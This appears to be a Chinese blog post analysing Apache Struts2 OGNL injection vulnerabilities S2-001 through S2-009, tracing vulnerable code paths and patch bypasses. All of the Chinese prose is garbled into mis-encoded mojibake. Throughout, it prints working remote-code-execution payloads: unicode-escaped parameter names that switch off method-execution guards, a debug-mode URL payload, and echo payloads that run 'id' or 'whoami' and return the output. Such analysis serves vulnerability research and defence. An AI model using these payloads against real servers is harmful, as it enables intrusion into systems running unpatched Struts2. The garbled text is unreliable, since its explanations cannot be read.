ÊºèÊ¥û‰∫ßÁîüÂéüÂõ†Âú®‰∫éÔºöÁî®&lt;s:textfield&gt;Ê†áÁ≠æÔºåÂéüÊ†∑ËøîÂõûÁî®Êà∑ËæìÂÖ•Êó∂Ôºå‰ºöËøá‰∏ÄÊ¨°OGNLË°®ËææÂºèÁöÑËß£ÊûêÊâßË°å„ÄÇÊØîÂ¶ÇÂú∫ÊôØÁôªÈôÜÁöÑÂú∞ÊñπÔºåÁî®Êà∑ÂêçÂØÜÁ†ÅÊ†°È™åÈîôËØØÔºå‰∏çË∑≥ËΩ¨È°µÈù¢ÔºåÁõ¥Êé•Â∞ÜÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÊîæÂà∞È°µÈù¢Ëß£ÊûêÂêéËøîÂõû„ÄÇ source: ‰ΩøÁî®‰∫Üs:textfieldÊ†áÁ≠æÁî®‰∫éË°®ÂçïÁîüÊàêÔºåÂΩìÁî®Êà∑ËæìÂÖ•‰∏çÂêàÊ≥ïÊó∂ÔºåÂ∞ÜÁî®Êà∑ÁöÑËæìÂÖ•ÂÜÖÂÆπÊ∏≤ÊüìÂà∞ËøîÂõûÁöÑÈ°µÈù¢‰∏ä sink: jspÊ∏≤ÊüìË∞ÉÁî®doEndTagÔºåÂêéÁª≠Áî±‰∫éËØÜÂà´Âá∫Áî®Êà∑ËæìÂÖ•‰∏≠OGNLË°®ËææÂºèËÄåË∞ÉÁî®Ognl.getValue ÊºèÊ¥ûÂàÜÊûê‰∏ªË¶ÅÂá∫ÈóÆÈ¢òÁöÑÊòØJSP‰∏≠&lt;s:textfield&gt;Ê†áÁ≠æÔºåStruts2ÈáåÂ§ÑÁêÜtextfieldÁöÑÊòØorg.apache.struts2.components.UIBean ÁúãÂà∞Âú®Â§ÑÁêÜparamsÊó∂ÔºåÂΩìparametersÈáå‰∏çÂ≠òÂú®valueËøô‰∏™keyÁöÑÊó∂ÂÄôÔºå‰ºöËøõÂà∞ÊâßË°ånameÁõ∏ÂØπÂ∫îÁöÑvalue‰∏äÊù•„ÄÇÂπ∂‰∏îaltSyntaxÈªòËÆ§ÈÖçÁΩÆ‰∏∫true ‰ºöÂú®ÂΩìÂâçÁöÑnameÂ∑¶Âè≥Âä†‰∏äOGNLË°®ËææÂºèÁöÑÊ†áËØÜ%{name}ÔºåËøôÈáåÁöÑnameÊòØ&lt;s:textfield name=&quot;name&quot;ÔºånameÂ≠óÊÆµÁöÑÂÄºÔºåÊØîÂ¶ÇËøôÈáåname=&quot;username&quot;ÔºåÊ≠§Êó∂‰ºöÂèòÊàê%{username}.ÁªßÁª≠ÂæÄ‰∏ãË∑ü ËøôÈáåÁöÑStringÁ±ªÂûãÁöÑËΩ¨Âåñ‰∏ªË¶ÅÁî®‰∫ÜTextParesUtil.translateVariables()Êù•Â§ÑÁêÜÔºåËøôÈáåÁúãÁúãÂÖ∑‰Ωì‰ªñÊÄé‰πàÂÅöÁöÑ com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97 ËøôÈáå‰ºöÂéªÂà§Êñ≠‰º†ÂÖ•ÁöÑexpressionÊòØÂê¶ÊòØOGNLË°®ËææÂºèÁöÑÊ†ºÂºèÁöÑ%{xxx}ÔºåÂ¶ÇÊûúÊòØÁöÑËØùÔºåÂ∞±‰ºöÂéªOgnlValueStackÈáåÈù¢ÂéªÊâæÂØπÂ∫îÁöÑÂÜÖÂÆπ(ËøôÂùóÂ∞±ÊòØOGNLË°®ËææÂºèÁöÑËÆ°ÁÆóÁªìÊûúÔºåfindValueÂáΩÊï∞ÂêéÁª≠‰ºöÂéªË∞ÉÁî®OgnlUtil.getValueÔºåËØ¶ÁªÜÁöÑÂèØ‰ª•ÁúãÊàëÂü∫Á°ÄÈáåÂàóÁöÑÊñáÁ´†) ÊâÄ‰ª•ËøôÈáåÊàë‰ª¨Á¨¨‰∏ÄÈÅç‰º†ÂÖ•ÁöÑ%{name}‰ºöËß£ÊûêËé∑ÂæóÂØπÂ∫îÁöÑÂÄº%{@java.lang.Runtime.....} Á¨¨‰∫åÈÅç‰ºöÂéªËß£Êûê%{@java.lang.Runtime....}ÔºåËøôÈáåÊâßË°å‰∫ÜÊàë‰ª¨ÊÉ≥Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§„ÄÇ ÂõûÊòæPOCÂâçÈù¢ÁÆÄÂçïÁî®‰∫ÜOGNLË°®ËææÂºèË∞ÉÁî®ÈùôÊÄÅÊñπÊ≥ïÁöÑÂΩ¢ÂºèÊù•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§@java.lang.Runtime@getRuntime().exec(command) ËøôÈáåS2-001ÂÖ∂ÂÆûÊòØ‰ºöÁõ¥Êé•ÂõûÊòæÁöÑÔºåÂ∞ÜÊõøÊç¢ÂéüÊúâÁöÑinputÊ†áÁ≠æÁöÑÂÜÖÂÆπÔºåËøôÈáåÊç¢‰∏ÄÁßçÊñπÂºèÊù•ËøõË°åÂõûÊòæÔºåÂà©Áî®Struts2ÁöÑHttpServletResponseÊù•ÂÜôÂÖ•ÂÜÖÂÆπ„ÄÇ 1234#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(xxxxxx),#writer.flush(),#writer.close() ÂÖà‰ªé‰∏ä‰∏ãÊñácontext‰∏≠ÂèñÂá∫HttpServletResponseÁöÑÂÆû‰æãÔºåÁî®Âà∞ÁöÑÂÆûÈôÖÊòØHttpServletResponseWrapper ÁÑ∂ÂêéËé∑ÂèñÂΩìÂâçresponseÁöÑwriterÂØπË±°ÔºåÂú®Âà©Áî®ËØ•writerÊù•ÂÜôÂÖ•‰ªªÊÑèÂÜÖÂÆπ ÊØîÂ¶Ç 1%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125; ÂΩìÁÑ∂‰Ω†‰πüÂèØ‰ª•ÊõøÊç¢ÊàêÊâßË°åÂëΩ‰ª§ÂêéÁöÑÂÜÖÂÆπ 1234567891011121314#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new InputStreamReader(#is),#br=new BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),// ‰∏äÈù¢‰∏ªË¶ÅËé∑ÂèñÊâßË°åÂêéÁöÑÂÜÖÂÆπÔºå‰∏ãÈù¢‰∏ªË¶ÅÂÅöÂõûÊòæÊìç‰Ωú#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(#str),#writer.flush(),#writer.close()%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125; ‰øÆÂ§çÂú®&gt;=2.0.9ÁâàÊú¨ÁöÑstruts2‰∏äÔºåcom.opensymphony.xwork2.util.TextParseUtil#translateVariablesÂÅö‰∫ÜÂæ™ÁéØÂà§Êñ≠Ôºå‰∏çÂÖÅËÆ∏ÈÄíÂΩíÊâßË°åOGNLË°®ËææÂºè ÈªòËÆ§maxLoopCount‰∏∫1ÔºåÊâÄ‰ª•Â§ÑÁêÜÂÆå%{name}ÂêéÔºå‰∏ç‰ºöÂÜçÁªßÁª≠ÂØπ‰ªñÁöÑÂÄºËøõË°åOGNLË°®ËææÂºèÁöÑÊâßË°å‰∫Ü„ÄÇ 2. S2-003ÂΩ±ÂìçËåÉÂõ¥Ôºö2.0.0 - 2.0.11.2 ÁúãÂÆòÁΩëÁöÑ‰ªãÁªçÔºåÈóÆÈ¢òÂá∫Âú®ParametersInterceptorÔºåÂâçÈù¢Âà©Áî®‰∫ÜOgnl.getValueÊù•ËÆ°ÁÆóOGNLË°®ËææÂºèÔºåËÄåS2-003Áî®ÁöÑÂàôÊòØOgnl.setValueÔºåËØ•ÂáΩÊï∞‰πüÂêåÊ†∑ÂèØ‰ª•ËÆ°ÁÆóOGNLË°®ËææÂºè source: ÂèÇÊï∞ÁöÑkeyÔºå‰ΩøÁî®unicodeÁºñÁ†ÅÁªïËøá#ÁöÑÊ£ÄÊµã sink: Ë∞ÉÁî®Ognl.setValue ÊºèÊ¥ûÂàÜÊûêStruts2Âú®Â§ÑÁêÜÂèÇÊï∞ÂÜÖÂÆπÊó∂ÔºåÂ∞ÜË∞ÉÁî®com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParametersÂáΩÊï∞ÔºåÂ°´ÂÖÖÂà∞OgnlVauleStackÁöÑcontext‰∏ä‰∏ãÊñáÈáå„ÄÇ ËøôÈáå‰ºöÂÖàËøá‰∏ÄÊ¨°acceptableNameÁöÑÊ£ÄÊü•Ôºà2.0.8ÁâàÊú¨Ôºâ ‰∏çËÉΩÂá∫Áé∞=„ÄÅ,„ÄÅ#„ÄÅ:‰ª•ÂèäË¢´ÊéíÈô§Âú®Â§ñÁöÑÂèÇÊï∞Âêç Âè™ÊúâÈÄöËøá‰∫ÜacceptableNameÂáΩÊï∞ÁöÑÊ£ÄÊü•ÊâçËÉΩÁªßÁª≠ÂæÄ‰∏ãËµ∞ÔºåÊâÄ‰ª•Êàë‰ª¨ÂøÖÈ°ªÁªïËøá‰∏äÈù¢ÁöÑÂá†‰∏™ÈóÆÈ¢òÔºåËøôÈáåÊºèÊ¥ûÂèëÁé∞ËÄÖÁî®‰∫ÜunicodeÁºñÁ†ÅÊù•ÁªïËøáÊ£ÄÊµã„ÄÇ ognl.JavaCharStream#readChar ÂΩìÈÅáÂà∞\\uunicodeÁºñÁ†ÅÔºå‰ºöÂÅö‰∏ÄÊ¨°ËΩ¨Êç¢ÔºåÊØîÂ¶Ç\\u0040‰ºöË¢´ËΩ¨Êàê@ ËÄåacceptableNameÂáΩÊï∞Âπ∂Ê≤°ÊúâËÄÉËôëunicodeÁºñÁ†ÅÁöÑÊñπÂºèÔºåÂØºËá¥ÂÖ∂ÂΩ¢ÂêåËôöËÆæ„ÄÇ ÂõûÂà∞setParametersÔºåÂêéÁª≠Ë∞ÉÁî®‰∫ÜOgnlValueStack.setValue ËøôÈáåÊúÄÁªàÂà∞‰∫ÜOgnlUtil.setValueËÆ°ÁÆóOGNLË°®ËææÂºè POCÂàÜÊûêÊù•Áúã‰∏Ä‰∏™Ë∞ÉÁî®ÂëΩ‰ª§ÊâßË°åÁöÑPOC 1('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app\\')')(bla)(bla) ÂÖàÊù•ÁúãÁ¨¨‰∏ÄÂè•ÔºåËØ•Êù°ognlË°®ËææÂºèÁî®‰∫éÂºÄÂêØÊñπÊ≥ïÊâßË°åÔºåÂõ†‰∏∫Âú®Ë∞ÉÁî®setParameters‰πãÂâçÔºåÂºÄÂèë‰∫∫ÂëòËÄÉËôëÂà∞‰∫ÜÂèÇÊï∞ÊâßË°åOGNLË°®ËææÂºèÁöÑÈ£éÈô©ÔºåÊâÄ‰ª•ÊèêÂâçÂÖ≥Èó≠‰∫ÜÂáΩÊï∞Ë∞ÉÁî®ÊâßË°å ËÆæÁΩÆÂÆå‰∫Ü‰πãÂêéÔºåÂÜçËøòÂéüÂõûÊù• ‰ΩÜÊòØOGNLË°®ËææÂºèÂØπ‰∫é‰∏ä‰∏ãÊñáÁöÑÂÜÖÂÆπÊòØÂèØÊéßÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•Âú®ËøõË°åÂáΩÊï∞Ë∞ÉÁî®ÂâçÔºåÂ∞ÜcontextÈáåÁöÑxwork.MethodAccessor.denyMethodExecutionËÆæ‰∏∫falseÔºå ËøôÊ†∑Á¨¨‰∫åÂè•pocÂ∞±ÂèØ‰ª•ÊâßË°åÂáΩÊï∞Ë∞ÉÁî®‰∫Ü„ÄÇ ÊâÄ‰ª•Âú®ÂèëÈÄÅËøô‰∏§Êù°POCÊó∂ÔºåÈúÄË¶ÅÊéßÂà∂Â•ΩËÆæÁΩÆfalseÂú®ÂâçÔºåÊâßË°åÂú®ÂêéÔºàasciiÊéíÂ∫èÔºåÂèØ‰ª•ÁúãÂõûÊòæpocÁöÑÂ§ÑÁêÜÔºâ Ë∑üÂâçÈù¢‰∏ÄÊ†∑ÔºåÂÜô‰∏Ä‰∏ãÂõûÊòæÁöÑPOC 123456789(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // ÊâßË°åÂëΩ‰ª§(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;(f)(('\\u0023writer\\u003d\\u0023context.get(\\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\\').getWriter()')(bla))&amp;(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // Ëé∑ÂèñresponseÔºåÂõûÊòæÊï∞ÊçÆ(h)(('\\u0023writer.flush()')(bla))&amp;(i)(('\\u0023writer.close()')(bla)) ËøôÈáåpocÁöÑÂÖàÂêéÈ°∫Â∫èÁî®Âà∞‰∫ÜÁ¨¨‰∏Ä‰∏™‰ΩçÁΩÆÔºåÂÆûÈôÖÁöÑognlË°®ËææÂºèÊîæÂà∞‰∫ÜÁ¨¨‰∫å‰∏™‰ΩçÁΩÆ(1)((2)(3)) ‰øÆÂ§çxwork&gt;=2.0.6 com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParametersÂ§ö‰∫Ü‰ª•‰∏ã‰ª£Á†Å ‰ΩéÁâàÊú¨Áî®ÁöÑÁõ¥Êé•ÊòØÂ∑≤Â≠òÂú®ÁöÑOgnlValueStackÔºå‰ªé2.0.6ÂºÄÂßãÔºå‰ΩøÁî®‰∫Ü‰∏Ä‰∏™Á©∫ÁöÑstackÊù•Â§ÑÁêÜÂèÇÊï∞ÁöÑËß£Êûê Âπ∂‰∏î‰ªéËøô‰∏™ÁâàÊú¨ÂºÄÂßãÂ§ö‰∫ÜSecurityMemberAccessÔºåÁî®Êù•ÈôêÂà∂ognlË°®ËææÂºè‰∏≠ÂáΩÊï∞Ë∞ÉÁî® Âú®ognl.OgnlRuntime#callAppropriateMethodË∞ÉÁî®ÂáΩÊï∞ÂâçÔºå‰ºöÂéªÂà§Êñ≠ÂáΩÊï∞ÊòØÂê¶ÂèØË¢´ËÆøÈóÆ(method‰∏ç‰∏∫null) ÂÖ∂ÂÆûËøôËæπisMethodAccessibleÁöÑËøîÂõûÁªìÊûúÊó†ÊâÄË∞ìÔºå‰ΩÜÊòØ‰∏çËÉΩÂú®Ëøô‰∏™ÂáΩÊï∞Ë∞ÉÁî®Êó∂Âá∫ÈîôÔºåÂá∫ÈîôÁöÑËØù‰πüÂ∞±Ëµ∞‰∏çÂà∞invokeMethod Áúã‰∏Ä‰∏ãÂÖ∑‰ΩìÁöÑÂÆûÁé∞ÔºåisMethodAccessibleÁöÑÂà§Êñ≠‰æùËµñ‰∫éSecurityMemberAccess ËøôÈáåÊàë‰ª¨‰∏ªË¶ÅÁúãisAcceptableProperty ‰∏ãÁ´ØÁÇπË∞ÉËØï‰Ω†‰ºöÂèëÁé∞Ëøô‰∏™ÁâàÊú¨acceptProperties‰∏∫Á©∫ÔºåËÄåexcludePropertiesÈùûÁ©∫ÔºåÊâÄ‰ª•Âú®Ë∞ÉÁî®isExcludeÂáΩÊï∞Êó∂ÔºåÊ≠£ÂàôË∞ÉÁî®pattern.matcher(null)‰ºöÊä•ÈîôÔºå‰πüÂ∞±Êó†Ê≥ïËææÂà∞Ë∞ÉÁî®ÂáΩÊï∞ÁöÑÁõÆÁöÑ‰∫ÜÔºàpropertiesName‰∏∫nullÔºâ„ÄÇ ÊâÄ‰ª•Â¶ÇÊûúË¶ÅÁªïËøáËøô‰∏™ÁâàÊú¨ÁöÑÈôêÂà∂ÔºåÈ¶ñÂÖàÈúÄË¶ÅËß£ÂÜ≥ÁöÑÊòØËøô‰∏™ÂáΩÊï∞ÁöÑÊä•ÈîôÈóÆÈ¢òÔºåÁúãS2-005 3. S2-005ÂΩ±ÂìçÁâàÊú¨Ôºöstruts2.0.0 - 2.1.8.1 S2-005‰∏∫S2-003ÁöÑ‰øÆÂ§çÁªïËøáÔºåÁõ¥Êé•ÂàÜÊûêPOC POCÂàÜÊûê123('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&amp;('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla) ÂâçÈù¢S2-003‰øÆÂ§çÈÉ®ÂàÜËØ¥Âà∞‰∫ÜÈúÄË¶ÅÁªïËøáisAcceptablePropertyÂáΩÊï∞Êä•ÈîôÁöÑÈóÆÈ¢òÊâçËÉΩÁªßÁª≠ÂæÄ‰∏ãËøõË°åÂáΩÊï∞Ë∞ÉÁî®„ÄÇ ‰ªé‰ª£Á†Å‰∏äÁúãÔºåÂè™Ë¶ÅexcludePropertiesÂíåacceptProperties‰∏∫Á©∫ÔºåÂ∞±‰∏ç‰ºöËøõÂà∞Ê≠£ÂàôÂåπÈÖçÁöÑÁéØËäÇÔºåÊâÄ‰ª•ÈúÄË¶ÅÂ∞Ü‰ªñ‰ª¨ÁΩÆ‰∏∫Á©∫ pocÈáåÁöÑÁ¨¨‰∏ÄË°åÂÅöÁöÑÂ∞±ÊòØËøô‰∏™‰∫ãÊÉÖÔºåÂ∞ÜexcludePropertiesÁΩÆ‰∏∫Á©∫ÈõÜÂêà ËøôÈáåÁúã‰∏Ä‰∏ã‰∏∫‰ªÄ‰πà‰ª•#_memberAccessÁöÑÊñπÂºèÂèØ‰ª•ËÆøÈóÆÂà∞OgnlContextÂØπË±°ÁöÑmemberAccessÂ±ûÊÄß ognl.OgnlContext#get ‰ªéOgnlContext‰∏ä‰∏ãÊñáËé∑ÂèñÂÜÖÂÆπÔºåÈ¶ñÂÖà‰ºöÂà§Êñ≠ÊòØÂê¶Âú®RESERVED_KEYSÈõÜÂêàÈáåÔºåÂ¶ÇÊûúÂ≠òÂú®ÔºåÂàôÁõ∏Â∫îÁöÑË∞ÉÁî®‰ªñÁöÑgettersÔºåÂ¶ÇÊûú‰∏çÂ≠òÂú®ÔºåÂàô‰ªéÂΩìÂâçÁöÑ‰∏ä‰∏ãÊñáÈáåÂéªÊâæËøô‰∏™key„ÄÇ ÊâÄ‰ª•#_memeberAccessÂÆûÈôÖËé∑ÂèñÁöÑÊòØOgnlContextÁöÑmemeberAccessÂ±ûÊÄßÂÜÖÂÆπ ËøòÊúâÂá∫Áé∞ÂèòÂåñÁöÑÂú∞ÊñπÔºåÁî±‰∫éÁé∞Âú®contextÈáåÊòØÊ≤°ÊúâresponseÂØπË±°ÂèØ‰ª•Ëé∑ÂèñÁöÑÔºåÊâÄ‰ª•Âú®Â§ÑÁêÜÂõûÊòæÁöÑÊó∂ÂÄôÊàë‰ª¨ÈúÄË¶ÅÊâæÂè¶Â§ñÁöÑÊñπÊ≥ï 12345678910(a)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla))&amp;(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))&amp;(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // ÊâßË°åÂëΩ‰ª§(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;(f)(('\\u0023writer\\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()')(bla))&amp;(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // Ëé∑ÂèñresponseÔºåÂõûÊòæÊï∞ÊçÆ(h)(('\\u0023writer.flush()')(bla))&amp;(i)(('\\u0023writer.close()')(bla)) ËøôÈáå‰ΩøÁî®‰∫Ü`@org.apache.struts2.ServletActionContext@getResponse()`ÈùôÊÄÅÊñπÊ≥ïÊù•Ëé∑Âèñresponse ‰øÆÂ§çxwork&gt;=2.2.1.1ÔºåÂØπÂèÇÊï∞ÂêçÂÅö‰∫ÜÊõ¥‰∏∫ÁªÜËá¥ÁöÑÊ≠£ÂàôÊ£ÄÊü•[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_&#39;\\\\s]+ 4. S2-007ËøôÈáåË∑üS2-008ÈáåÈù¢ÁöÑÁ¨¨‰∏Ä‰∏™ÊºèÊ¥û‰∏ÄÊ†∑ com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept value‰∏∫Êàë‰ª¨‰º†ÂÖ•ÁöÑÊï∞ÊçÆÔºåËøá‰∫Ü‰∏ÄÊ¨°getOverrideExpr ÂØπÊàë‰ª¨ÁöÑËæìÂÖ•Âõ¥‰∏ä‰∫ÜÂçïÂºïÂè∑ÔºåËøôÈáåÂ¶ÇÊûúÊàë‰ª¨ÁöÑpayload‰∏∫&#39;+xxxx+&#39;ÔºåËøôÈáåÁöÑxxxxÂ∞±ÈÄÉÈÄ∏Âá∫Êù•‰∫ÜÔºåËÄå‰∏çÂçïÂçïÊòØÂ≠óÁ¨¶‰∏≤‰∫Ü ÂêéÁª≠Â∞ÜÂ§ÑÁêÜÂ•ΩÁöÑÊï∞ÊçÆÊîæÂà∞‰∫ÜstackÁöÑoverridesÈáåÈù¢ ËÄåÂÆûÈôÖËß¶ÂèëÁöÑÂú∞ÊñπË∑üS2-001‰∏ÄÊ†∑ÔºåÊòØÂú®Ëß£ÊûêJSPÁöÑÊó∂ÂÄôÈÄ†ÊàêÁöÑ Âú®tryFIndValueÂáΩÊï∞‰∏≠Ôºå‰ªéstackÁöÑoverrides‰∏≠ÂèñÂá∫ÂâçÈù¢Âä†‰∫ÜÂçïÂºïÂè∑ÁöÑÊï∞ÊçÆÔºåÂπ∂Âú®ÂêéÁª≠Ë∞ÉÁî®Ognl.getValueÔºåÂØºËá¥‰∫ÜOgnlË°®ËææÂºèÁöÑÊâßË°å„ÄÇ POC1'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) +' xwork&gt;=2.2.3ÔºåognlË°®ËææÂºèËÆ°ÁÆóÊó∂ÔºåË∞ÉÁî®ÂáΩÊï∞ÁöÑÂáΩÊï∞Âà§Êñ≠isAcceptablePropertyÂ¶ÇÊûúname‰∏∫nullÁõ¥Êé•ËøîÂõûtrueÔºåÊâÄ‰ª•Êàë‰ª¨‰∏çÁî®ÂÉès2-005ÈÇ£Ê†∑ÊääexcludePropertiesÁΩÆ‰∏∫Á©∫ÈõÜÂêà„ÄÇ ‰ΩÜÊòØ‰ªéËøôÈáåÂºÄÂßãÔºåallowStaticMethodAccessÈªòËÆ§‰∏∫falseÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂÖ∂ÁΩÆ‰∏∫trueÔºåÊâçËÉΩÊ≠£Â∏∏ÊâßË°åÈùôÊÄÅÂáΩÊï∞„ÄÇ ÊâÄ‰ª•POCÁ¨¨‰∏Ä‰∫åÂè•ÈÉΩÊòØÂú®Ëß£Èô§ÈôêÂà∂ÔºåÁ¨¨‰∏âÂè•ÊâßË°åÂëΩ‰ª§ ÂÜô‰∏Ä‰∏ãÂõûÊòæÁöÑPOC 12345678910111213'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,#ret=@java.lang.Runtime@getRuntime().exec('id'),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close()) +' 5. S2-008S2-008‰∏ÄÂÖ±Êúâ4‰∏™ÊºèÊ¥ûÔºåËØ¶ÁªÜÁúãhttps://cwiki.apache.org/confluence/display/WW/S2-008 ÂÖ∂‰∏≠1Ë∑üS2-007Á±ª‰ººÔºå3‰∏çÁúã‰∫ÜÔºå‰∏ªË¶ÅÂÖ≥Ê≥®2Âíå4 CookieInterceptorËøôÈáåÁöÑÂéüÁêÜÂêåS2-005Á±ª‰ººÔºåËøôÈáåÁúã‰ª£Á†ÅÊØîËæÉÁõ¥ËßÇÔºåÊ≤°ÊúâÊê≠ÁéØÂ¢ÉË∞É‰∫Ü org.apache.struts2.interceptor.CookieInterceptor#intercept ËøôÈáå‰ºöÂà∞OgnlValueStack.setValueÔºå‰πüÂ∞±ÊòØÂêéÁª≠Ë∞ÉÁî®Ognl.setValueÔºåÁî®((1)(2))(3)ÁöÑÊñπÂºèÊù•ÊâßË°å‰ªªÊÑèOGNLË°®ËææÂºè DebuggingInterceptor ÂΩìÂºÄÂêØÂºÄÂèëËÄÖÊ®°ÂºèÊó∂Ôºå‰º†ÂÖ•debug=command&amp;expression=xxxxÔºåÂç≥ÂèØÊâßË°åOGNLË°®ËææÂºè POC123?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))// ÂõûÊòæPOC(%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),new java.lang.String(%23res)) 6. S2-009ÂΩ±ÂìçËåÉÂõ¥Ôºö2.0.0 - 2.3.1.1 ÈíàÂØπS2-005ÁöÑ‰øÆÂ§çÔºåÂØπÂèÇÊï∞ÂÅö[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_&#39;\\\\s]+Ê≠£ÂàôÊ£ÄÊü•ÔºåËøôÈáåËßÑÈÅø‰∫ÜÂèÇÊï∞Âêç‰∏≠Âá∫Áé∞#„ÄÅunicodeÁºñÁ†ÅÁ≠â S2-009ÊòØÂØπS2-005ÁöÑÁªïËøáÔºåËøôÈáåÁî®ÁöÑÂ∞±ÊòØOgnl.setValueÂáΩÊï∞ÁöÑÂè¶‰∏ÄÁßçÁî®Ê≥ïa[(1)(2)]ÔºåËøòÊúâ‰∏Ä‰∏™ÊØîËæÉÂ∑ßÂ¶ôÁöÑÊòØÔºåÂâçÈù¢ÁöÑÂá†‰∏™ÊºèÊ¥ûÂà©Áî®ÔºåÊàë‰ª¨ÈÉΩÊòØÁõ¥Êé•Âú®(1)ÂÜô‰∏äË¶ÅÊâßË°åÁöÑOGNLË°®ËææÂºèÔºåËÄåS2-009ÂàôÈÄöËøácontextÈáåÁöÑÂÜÖÂÆπÊù•ËøõË°å‰∏Ä‰∏™‰∏≠ËΩ¨ÔºåÂ∞ÜOGNLË°®ËææÂºèÊîæÂà∞key=valueÁöÑvalueÁöÑ‰ΩçÁΩÆÔºåÂÜçÁî±a[(key)(2)]ÁöÑÊñπÂºèÂéªÊâßË°åvalueÁöÑÂÜÖÂÆπ„ÄÇ 123OgnlContext context = new OgnlContext();context.put(\"test\",\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\"); // ÂÅáËÆæcontextÂ≠òÂú®ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÁöÑOGNLË°®ËææÂºètestOgnl.setValue(\"a[(test)(bla)]\",context,\"\");// ‰ª•a[(test)(bla)],ÊâßË°åtestÊâÄ‰ª£Ë°®ÁöÑOGNLË°®ËææÂºè ‰∏äÈù¢‰ª£Á†Å‰∏≠ÁöÑÂÅáËÆæÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰º†ÂÖ•?param=xxxÁöÑÊñπÂºèÂ∏¶ÂÖ• Ê≥®ÊÑèËøôÈáåÁöÑparamÈúÄË¶ÅÊòØÂΩìÂâçActionÁöÑ‰∏Ä‰∏™Á±ªÂ±ûÊÄßÔºà‰πüÂ∞±ÊòØÂéüÊú¨Â∞±Â≠òÂú®ÁöÑÂèÇÊï∞ÂêçÔºâÔºåÊØîÂ¶ÇÂéüÊú¨Ë°®ÂçïÈáåÂ∞±ÊúâpasswordÔºåÈÇ£‰πà‰Ω†Â∞±ÂèØ‰ª•Âú®passwordÈáåÈù¢Â°´ÂÖÖOGNLË°®ËææÂºè Âõ†‰∏∫Âú®ËÆ°ÁÆóOGNLË°®ËææÂºè(password)(bla)ÁöÑÊó∂ÂÄô(Ëß£ÊûêÂá∫‰∏§‰∏™ASTProperty) ÂêéÁª≠ÂÜçÊâßË°åËøáÁ®ã‰∏≠Ôºå‰ºöÂéªÊü•ÊâæÂΩìÂâçÁöÑactionÈáåÈù¢ÊòØÂê¶Âê´ÊúâËøô‰∏™Â±ûÊÄß com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty 